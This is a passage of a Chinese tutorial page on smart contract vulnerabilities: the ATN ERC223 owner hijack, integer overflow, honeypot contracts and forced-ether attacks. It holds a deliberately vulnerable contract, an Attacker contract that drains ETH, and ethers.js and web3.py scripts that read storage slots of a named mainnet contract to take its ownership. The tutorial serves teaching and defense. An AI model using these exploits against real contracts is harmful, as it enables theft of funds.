</ol>
<hr>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><code>ds-auth</code> 本身是灵活的授权框架，但它基于 <code>msg.sender</code>&#x2F;<code>msg.sig</code> 的判断在 <strong>遇到 ERC223 的回调能力</strong>（或其它可执行回调的 token 标准&#x2F;合约）时，会放大任何授权配置错误或设计缺陷的风险——攻击者可以用“在回调中发起调用”的技术把自己伪装为被授权的调用者，从而执行敏感操作（如擅自铸币、改 owner），这正是 ATN 类攻击背后的核心机制。</p>
<h2 id="ATN-攻击流程"><a href="#ATN-攻击流程" class="headerlink" title="ATN 攻击流程"></a>ATN 攻击流程</h2><p><strong>1. 利用 ERC223 方法漏洞提权（将自己设为 owner）</strong></p>
<p><strong>动作</strong>：攻击者利用合约中 ERC223 相关实现的漏洞，执行提权操作，把自己的地址设为了合约 <code>owner</code>。<br> <strong>目的</strong>：获取管理权限以便后续铸造或转移代币。<br> <strong>链上交易</strong>：<br> <a target="_blank" rel="noopener" href="https://etherscan.io/tx/0x3b7bd618c49e693c92b2d6bfb3a5adeae498d9d170c15fcc79dd374166d28b7b">https://etherscan.io/tx/0x3b7bd618c49e693c92b2d6bfb3a5adeae498d9d170c15fcc79dd374166d28b7b</a></p>
<hr>
<p><strong>2. 发行&#x2F;铸造大量 ATN 到攻击主地址</strong></p>
<p><strong>动作</strong>：拿到 <code>owner</code> 权限后，攻击者调用铸造&#x2F;发行（mint）或类似的管理函数，把大量 ATN 发行到自己的主控地址。<br> <strong>描述</strong>：你记录为 “发行 1100W ATN”。（注：<code>1100W</code> 常被用来表示 <code>1100 万</code>，即 <strong>11,000,000 ATN</strong>；若表述有别，请按链上数量为准。）<br> <strong>链上交易</strong>：<br> <a target="_blank" rel="noopener" href="https://etherscan.io/tx/0x9b559ffae76d4b75d2f21bd643d44d1b96ee013c79918511e3127664f8f7a910">https://etherscan.io/tx/0x9b559ffae76d4b75d2f21bd643d44d1b96ee013c79918511e3127664f8f7a910</a></p>
<hr>
<p><strong>3. 恢复 owner 为原来地址（企图掩盖痕迹）</strong></p>
<p><strong>动作</strong>：攻击者将 <code>owner</code> 设置回原先地址或其他地址，以掩盖刚才的提权痕迹，试图减少可追溯性&#x2F;诱导审计误判。<br> <strong>链上交易</strong>：<br> <a target="_blank" rel="noopener" href="https://etherscan.io/tx/0xfd5c2180f002539cd636132f1baae0e318d8f1162fb62fb5e3493788a034545a">https://etherscan.io/tx/0xfd5c2180f002539cd636132f1baae0e318d8f1162fb62fb5e3493788a034545a</a></p>
<hr>
<p><strong>4. 将偷得的代币分散到多个地址（洗分&#x2F;分散风险）</strong></p>
<p><strong>动作</strong>：攻击者把获得的大额 ATN 分批转到 <strong>14 个地址</strong>，以分散和转移资产，增加追踪难度并为后续换币&#x2F;出金做准备。<br> <strong>目的</strong>：规避监测、降低单一地址风控触发概率、准备跨交易所或通过去中心化交易所（DEX）套现。<br> <strong>（若需）链上交易示例</strong>：可在攻击主地址的 token 转账记录中查看相应多笔 <code>transfer</code>。</p>
<h1 id="算术溢出-under-flows"><a href="#算术溢出-under-flows" class="headerlink" title="算术溢出(under flows)"></a>算术溢出(under flows)</h1><ul>
<li><p><strong>算数溢出&#x2F;下溢</strong>：当一个整数加法&#x2F;减法超出其能表示的范围时（例如 <code>uint8</code> 超过 255），旧版 Solidity 会<code>wrap around</code>（模 2^n），导致值变成看似“任意”的小&#x2F;大数；攻击者可以利用这一点改写余额&#x2F;计数，从而绕过检查或窃取资产。</p>
</li>
<li><p><strong>现代 Solidity（^0.8.0 及以上）默认检测溢出并 revert</strong>，所以真正的溢出攻击多见于使用旧版本或显式 <code>unchecked</code> 的代码，或库错误地禁用了检查。</p>
</li>
</ul>
<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.7.0;</span><br><span class="line"></span><br><span class="line">contract VulnerableVault &#123;</span><br><span class="line">    // 用 uint8 故意演示容易溢出的类型（范围 0..255）</span><br><span class="line">    mapping(address =&gt; uint8) public credits;</span><br><span class="line">    </span><br><span class="line">    // 合约需要有以太来支付 redeem 时使用</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // 给自己增加积分（本意：管理员或系统调用，错误地设为 public）</span><br><span class="line">    // 只做了简单加法，没有检测 overflow</span><br><span class="line">    function addCredits(uint8 amount) public &#123;</span><br><span class="line">        credits[msg.sender] += amount; // 如果 credits[msg.sender] + amount &gt; 255，会 wrap</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 用积分换取以太（1 credit = 1 wei，为示例而简化）</span><br><span class="line">    function redeem(uint8 amount) public &#123;</span><br><span class="line">        require(credits[msg.sender] &gt;= amount, &quot;not enough credits&quot;);</span><br><span class="line">        credits[msg.sender] -= amount;</span><br><span class="line">        // 转账（简化示例：1 credit 对应 1 wei）</span><br><span class="line">        payable(msg.sender).transfer(uint256(amount));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 管理员可查看合约余额</span><br><span class="line">    function vaultBalance() external view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><code>addCredits</code> 是 <code>public</code> 并允许任意 <code>amount</code>，而且用 <code>uint8</code> 并<strong>不检查溢出</strong> → 调用时可导致 <code>credits[msg.sender]</code> wrap（例如从 0 加 255 后是 255；从 200 加 100 会变成 44）。</p>
<p>如果攻击者能把 <code>credits</code> 的值设成一个非常大的（或恰好满足条件的）数，就能绕过逻辑或用大量积分兑换大量以太。</p>
<p>攻击合约</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.7.0;</span><br><span class="line"></span><br><span class="line">interface IVulnerableVault &#123;</span><br><span class="line">    function addCredits(uint8 amount) external;</span><br><span class="line">    function redeem(uint8 amount) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attacker &#123;</span><br><span class="line">    IVulnerableVault public vault;</span><br><span class="line">    address payable public owner;</span><br><span class="line"></span><br><span class="line">    constructor(address vaultAddr) &#123;</span><br><span class="line">        vault = IVulnerableVault(vaultAddr);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 演示：利用 addCredits 的溢出把自己的 credits 变成很大（或者满足 redeem 条件），然后 redeem</span><br><span class="line">    // 举例：如果 credits 初始为 0，我们调用 addCredits(250) =&gt; 250</span><br><span class="line">    // 再调用 addCredits(10) =&gt; 250 + 10 = 260 -&gt; wrap to 4 (在 uint8 下)</span><br><span class="line">    // 更激进地，攻击者可以逐步凑出需要的数值以逃避检查或制造任意余额</span><br><span class="line">    function exploit() external &#123;</span><br><span class="line">        // 1. 把自己 credits 提高到一个期望值（示例随意）</span><br><span class="line">        vault.addCredits(250); // credits = 250</span><br><span class="line">        vault.addCredits(10);  // overflow: 250 + 10 = 260 -&gt; 4 (示例如何 wrap)</span><br><span class="line">        // 2. 如果想要花掉很多，则可根据合约逻辑进一步操作</span><br><span class="line">        // 此处仅为示例：尝试 redeem 一小部分</span><br><span class="line">        vault.redeem(4);</span><br><span class="line">        // 3. 最后把偷到的以太转走（如果有）</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 接收来自 Vault 的以太</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p><strong>修复方式 A — 在旧 Solidity（&lt;0.8）中使用 SafeMath（OpenZeppelin）</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import &quot;@openzeppelin/contracts/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">用uint256</span><br><span class="line"></span><br><span class="line">SafeMath.add 在发生 overflow 时会 revert</span><br></pre></td></tr></table></figure>



<p><strong>修复方式 B — 在现代 Solidity (^0.8.0+) 使用内置检查（更简洁）</strong></p>
<blockquote>
<p>Solidity 0.8+ 默认对整型运算溢出做检测并 <code>revert</code>。推荐升级编译器并使用 <code>uint256</code>。</p>
</blockquote>
<h2 id="漏洞实例-合约PolyAi-AI"><a href="#漏洞实例-合约PolyAi-AI" class="headerlink" title="漏洞实例:合约PolyAi(AI)"></a>漏洞实例:合约PolyAi(AI)</h2><p>合约地址:<a target="_blank" rel="noopener" href="https://cn.etherscan.com/address/0x5121e348e897daef1eef23959ab290e5557cf274#code">https://cn.etherscan.com/address/0x5121e348e897daef1eef23959ab290e5557cf274#code</a></p>
<hr>
<h1 id="蜜罐合约"><a href="#蜜罐合约" class="headerlink" title="蜜罐合约"></a>蜜罐合约</h1><h2 id="合约一"><a href="#合约一" class="headerlink" title="合约一"></a>合约一</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function GetFreebie() </span><br><span class="line">public </span><br><span class="line">payable &#123;</span><br><span class="line">    if (msg.value &gt; 1 ether) &#123;              msg.sender.transfer(this.balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/thec00nsmart-contract-honeypots,blob/master/WVhaleGiveaway1.sol">https://github.com/thec00nsmart-contract-honeypots,blob/master/WVhaleGiveaway1.sol</a></p>
<h3 id="为什么会攻击"><a href="#为什么会攻击" class="headerlink" title="为什么会攻击"></a>为什么会攻击</h3><p>向右滑看看…….</p>
<p><img src="https://s2.loli.net/2025/10/13/gOG37wIl6XuZRdm.png" alt="image.png"></p>
<h2 id="合约二"><a href="#合约二" class="headerlink" title="合约二"></a>合约二</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function multiplicate(address payable adr) public payable &#123;</span><br><span class="line">    if (msg.value &gt;= address(this).balance) &#123;</span><br><span class="line">        adr.transfer(address(this).balance + msg.value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>Github地址: </p>
<blockquote>
<p>smart-contract-honeypots&#x2F;MultiplicatorX3.sol smart-contract-honeypots&#x2F;Multiplicator.sol</p>
</blockquote>
</li>
<li><p>智能合约地址: </p>
<blockquote>
<p>0x5aA88d2901C68fdA244f1D0584400368d2C8e739</p>
</blockquote>
</li>
</ul>
<p><strong>关键点：</strong></p>
<ul>
<li><p><code>msg.value</code> 是调用者发送的以太数量。</p>
</li>
<li><p><code>address(this).balance</code> 是函数执行时合约的余额 <strong>已经包含本次 msg.value</strong>。</p>
</li>
<li><p><strong>执行 transfer</strong>（如果条件成立）</p>
<ul>
<li><p>如果条件成立（只有在合约原余额为 0 且 msg.value &gt; 0 时），EVM 会执行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adr.transfer(address(this).balance + msg.value);</span><br></pre></td></tr></table></figure>
</li>
<li><p>注意此时：</p>
<ul>
<li><code>address(this).balance</code> 已经包含 msg.value。</li>
<li>这里又加上 <code>msg.value</code> → 会试图转出 <strong>2倍的 msg.value</strong>，而合约实际余额只够 <code>msg.value</code> → 会 <strong>抛出异常</strong>，交易 revert。</li>
</ul>
</li>
</ul>
<p><strong>交易结算</strong></p>
<ul>
<li>若 transfer 执行失败，整个交易 revert，合约余额和发送者余额回滚到交易前的状态。</li>
<li>已消耗的 gas 不会返还。</li>
</ul>
</li>
</ul>
<h2 id="合约三"><a href="#合约三" class="headerlink" title="合约三"></a>合约三</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">contract Owned &#123;</span><br><span class="line">    address public owner; // slot 0</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner &#123;</span><br><span class="line">        if (msg.sender != owner) revert();</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TestBank is Owned &#123;</span><br><span class="line">    address public msgSender; // slot 1</span><br><span class="line">    uint256 ecode;</span><br><span class="line">    uint256 evalue;</span><br><span class="line"></span><br><span class="line">    function useEmergencyCode(uint256 code) public payable &#123;</span><br><span class="line">        if (code == ecode &amp;&amp; msg.value == evalue) &#123;</span><br><span class="line">            owner = msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint amount) public onlyOwner &#123;</span><br><span class="line">        require(amount &lt;= address(this).balance);</span><br><span class="line">        msg.sender.transfer(amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>owner</strong>：存储在 slot 0，用于记录合约的拥有者。</p>
<p><strong>onlyOwner 修饰符</strong>：限制函数只能由拥有者调用，否则回滚。</p>
<p><strong>msgSender</strong>：存储调用者地址（slot 1）。</p>
<p><strong>ecode &amp; evalue</strong>：用于紧急代码验证。</p>
<p><strong>useEmergencyCode</strong>：</p>
<ul>
<li>若输入 <code>code</code> 与合约存储的 <code>ecode</code> 匹配，并且发送 ETH 等于 <code>evalue</code>，则将 <code>owner</code> 设置为 <code>msg.sender</code>。</li>
</ul>
<p><strong>withdraw</strong>：</p>
<ul>
<li>仅限拥有者调用，可提现合约余额。</li>
</ul>
<p>Github地址: </p>
<blockquote>
<p> smart-contract-honeypots&#x2F;TestBank.sol </p>
</blockquote>
<p>智能合约地址：  </p>
<blockquote>
<p>0x70C01853e4430cae353c9a7AE232a6a95f6CaFd9  </p>
</blockquote>
<h3 id="1-Solidity-合约存储槽规则"><a href="#1-Solidity-合约存储槽规则" class="headerlink" title="1. Solidity 合约存储槽规则"></a>1. Solidity 合约存储槽规则</h3><ul>
<li>每个状态变量在 EVM 存储中占一个或多个 <strong>slot</strong>（32 字节 &#x3D; 256 位）。</li>
<li>变量存储顺序：<ol>
<li><code>owner</code> → slot 0</li>
<li><code>msgSender</code> → slot 1</li>
<li><code>ecode</code> → slot 2</li>
<li><code>evalue</code> → slot 3</li>
</ol>
</li>
</ul>
<blockquote>
<p>注：这里假设没有打包优化，因为 <code>uint256</code> 本身正好占 1 个 slot。</p>
</blockquote>
<hr>
<h3 id="2-获取存储槽的值"><a href="#2-获取存储槽的值" class="headerlink" title="2. 获取存储槽的值"></a>2. 获取存储槽的值</h3><p>如果你有合约地址（比如 <code>0x70C01853e4430cae353c9a7AE232a6a95f6CaFd9</code>），可以用 <strong>web3 或 ethers.js</strong> 读取 storage：</p>
<h3 id="示例（ethers-js）"><a href="#示例（ethers-js）" class="headerlink" title="示例（ethers.js）"></a>示例（ethers.js）</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">&quot;ethers&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 连接网络</span></span><br><span class="line"><span class="keyword">const</span> provider = <span class="keyword">new</span> ethers.<span class="property">providers</span>.<span class="title class_">JsonRpcProvider</span>(<span class="string">&quot;https://mainnet.infura.io/v3/YOUR_KEY&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 合约地址</span></span><br><span class="line"><span class="keyword">const</span> address = <span class="string">&quot;0x70C01853e4430cae353c9a7AE232a6a95f6CaFd9&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取 slot</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">readSlots</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> ecodeSlot = <span class="number">2</span>;   <span class="comment">// ecode 在 slot 2</span></span><br><span class="line">    <span class="keyword">const</span> evalueSlot = <span class="number">3</span>;  <span class="comment">// evalue 在 slot 3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> ecodeHex = <span class="keyword">await</span> provider.<span class="title function_">getStorageAt</span>(address, ecodeSlot);</span><br><span class="line">    <span class="keyword">const</span> evalueHex = <span class="keyword">await</span> provider.<span class="title function_">getStorageAt</span>(address, evalueSlot);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> ecode = ethers.<span class="property">BigNumber</span>.<span class="title function_">from</span>(ecodeHex);</span><br><span class="line">    <span class="keyword">const</span> evalue = ethers.<span class="property">BigNumber</span>.<span class="title function_">from</span>(evalueHex);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ecode:&quot;</span>, ecode.<span class="title function_">toString</span>());</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;evalue:&quot;</span>, evalue.<span class="title function_">toString</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">readSlots</span>();</span><br></pre></td></tr></table></figure>

<ul>
<li><code>getStorageAt</code> 会返回 slot 对应的 <strong>32 字节 hex</strong>。</li>
<li>转成 <code>BigNumber</code> 或整数即可得到 Solidity 的 uint256 原始值。</li>
</ul>
<hr>
<h3 id="3-理论推算"><a href="#3-理论推算" class="headerlink" title="3. 理论推算"></a>3. 理论推算</h3><ul>
<li>如果你 **知道合约部署时如何设置 <code>ecode</code> 和 <code>evalue</code>**（比如构造函数或管理员调用 <code>set</code> 函数），可以直接算出它们。</li>
<li>否则，合约内部没有公开 setter&#x2F;getter 时，唯一可行的方式就是读取 <strong>链上存储槽</strong>（方法如上）。</li>
</ul>
<hr>
<h3 id="4-注意事项"><a href="#4-注意事项" class="headerlink" title="4. 注意事项"></a>4. 注意事项</h3><ol>
<li><strong>读取 storage 并不花费 gas</strong>，只要使用 <code>call</code> 或 <code>provider.getStorageAt</code>。</li>
<li>即使变量是 <code>private</code>，链上存储仍可读取。</li>
<li>对蜜罐合约来说，这两个值通常就是 <strong>触发 owner 转移的条件</strong>。<ul>
<li>一旦知道 <code>ecode</code> 和 <code>evalue</code>，可以通过 <code>useEmergencyCode(ecode)</code> 并发送 <code>evalue</code> ETH 来试图改变 owner。</li>
</ul>
</li>
</ol>
<h2 id="读取脚本"><a href="#读取脚本" class="headerlink" title="读取脚本"></a>读取脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 连接以太坊节点（可用 Infura、Alchemy 等）</span></span><br><span class="line">rpc_url = <span class="string">&quot;https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID&quot;</span></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(rpc_url))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 合约地址</span></span><br><span class="line">contract_address = <span class="string">&quot;0x70C01853e4430cae353c9a7AE232a6a95f6CaFd9&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 存储槽（根据 Solidity 状态变量顺序）</span></span><br><span class="line"><span class="comment"># slot 0: owner</span></span><br><span class="line"><span class="comment"># slot 1: msgSender</span></span><br><span class="line"><span class="comment"># slot 2: ecode</span></span><br><span class="line"><span class="comment"># slot 3: evalue</span></span><br><span class="line">ecode_slot = <span class="number">2</span></span><br><span class="line">evalue_slot = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 读取 storage</span></span><br><span class="line">ecode_hex = w3.eth.get_storage_at(contract_address, ecode_slot)</span><br><span class="line">evalue_hex = w3.eth.get_storage_at(contract_address, evalue_slot)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 转换为整数</span></span><br><span class="line">ecode = <span class="built_in">int</span>.from_bytes(ecode_hex, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">evalue = <span class="built_in">int</span>.from_bytes(evalue_hex, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 输出</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ecode:&quot;</span>, ecode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;evalue:&quot;</span>, evalue)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h3><ol>
<li>安装 Web3.py：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install web3</span><br></pre></td></tr></table></figure>

<ol>
<li>替换 <code>rpc_url</code> 为你的节点 URL（Infura &#x2F; Alchemy &#x2F; 自建节点都可以）。</li>
<li>运行脚本即可读取链上 <code>ecode</code> 和 <code>evalue</code> 的原始 uint256 值。</li>
</ol>
<blockquote>
<p>同类项目 :KingOfTheHill</p>
</blockquote>
<hr>
<h1 id="意外之财"><a href="#意外之财" class="headerlink" title="意外之财"></a>意外之财</h1><p>依赖合约全局余额做为业务条件会产生“意外之财”风险，因为合约余额可被外部力量修改而不触发合约代码。稳健的做法是使用<strong>内部会计&#x2F;凭证</strong>和更严格的资格检查，避免将关键权限或奖励直接绑定到 <code>address(this).balance</code>。</p>
<h3 id="1-合约示例"><a href="#1-合约示例" class="headerlink" title="1. 合约示例"></a>1. 合约示例</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract EtherGame &#123;</span><br><span class="line">    uint256 public finalMilestone = 10 ether;</span><br><span class="line"></span><br><span class="line">    // 玩家存入以太，目标是让合约余额达到 finalMilestone</span><br><span class="line">    function play() public payable &#123;</span><br><span class="line">        // 注意：address(this).balance 已经包含了本次 msg.value（在执行时）</span><br><span class="line">        uint256 currentBalance = address(this).balance;</span><br><span class="line">        require(currentBalance &lt;= finalMilestone, &quot;exceeds milestone&quot;);</span><br><span class="line">        // 其他逻辑（记录玩家贡献等）...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 任何人都可调用，若合约余额正好等于 finalMilestone 则奖励被认领</span><br><span class="line">    function claimReward() public &#123;</span><br><span class="line">        require(address(this).balance == finalMilestone, &quot;milestone not reached&quot;);</span><br><span class="line">        // 发放奖励（示例：把余额转给调用者）</span><br><span class="line">        payable(msg.sender).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-问题与风险（为什么会出现“意外之财”）"><a href="#2-问题与风险（为什么会出现“意外之财”）" class="headerlink" title="2. 问题与风险（为什么会出现“意外之财”）"></a>2. 问题与风险（为什么会出现“意外之财”）</h3><ul>
<li>合约逻辑<strong>直接依赖 <code>address(this).balance</code></strong> 来判断是否到达目标（<code>finalMilestone</code>）。</li>
<li><strong>合约余额可以在不执行合约任意代码的情况下被改变</strong>（例如 <code>selfdestruct</code>、矿工奖励或他人事先转账），导致 <code>claimReward</code> 条件被意外满足，任何人都能调用领取奖励（包括并非真正参与游戏的地址）。</li>
<li>因为 <code>address(this).balance</code> 在进入函数时已经包含 <code>msg.value</code>，所以在 <code>play()</code> 中错误地用 <code>address(this).balance + msg.value</code> 来判断会导致逻辑混淆（且通常是错误的）。</li>
</ul>
<hr>
<h3 id="3-示例攻击-触发场景"><a href="#3-示例攻击-触发场景" class="headerlink" title="3. 示例攻击&#x2F;触发场景"></a>3. 示例攻击&#x2F;触发场景</h3><ol>
<li>攻击者或第三方对合约执行 <code>selfdestruct(targetContract)</code>，把一定数额的 ETH 强制发送到该合约，使 <code>address(this).balance</code> 恰好等于 <code>finalMilestone</code>。</li>
<li>任何地址随后调用 <code>claimReward()</code>，因为 <code>address(this).balance == finalMilestone</code> 为真，合约把余额转给调用者 —— <strong>原本未参与出资的人可直接领取</strong>。</li>
</ol>
<hr>
<h3 id="4-三种不会触发-EVM-合约代码执行但会影响合约余额的途径"><a href="#4-三种不会触发-EVM-合约代码执行但会影响合约余额的途径" class="headerlink" title="4. 三种不会触发 EVM 合约代码执行但会影响合约余额的途径"></a>4. 三种不会触发 EVM 合约代码执行但会影响合约余额的途径</h3><ul>
<li><strong>Mining reward</strong>：矿工&#x2F;区块奖励（或内置奖励）分配到某些地址，会影响链上账户余额，但不触发目标合约的代码。</li>
<li>**selfdestruct(target)**：<code>selfdestruct</code> 把以太直接写入目标合约的余额，不会调用目标合约的 <code>receive</code>&#x2F;<code>fallback</code>，因此不会触发合约逻辑。</li>
<li><strong>Pre-sent Ether（事先转账）</strong>：任何地址直接向合约转账（<code>send</code>&#x2F;<code>transfer</code>&#x2F;<code>call</code>），或者部署时即有初始余额，这些都可能改变合约余额而无须被目标合约的业务逻辑处理。</li>
</ul>
<hr>
<h3 id="5-防御与最佳实践"><a href="#5-防御与最佳实践" class="headerlink" title="5. 防御与最佳实践"></a>5. 防御与最佳实践</h3><ul>
<li>**不要把关键业务逻辑直接依赖 <code>address(this).balance</code>**（尤其是决定谁可领取资产的逻辑）。</li>
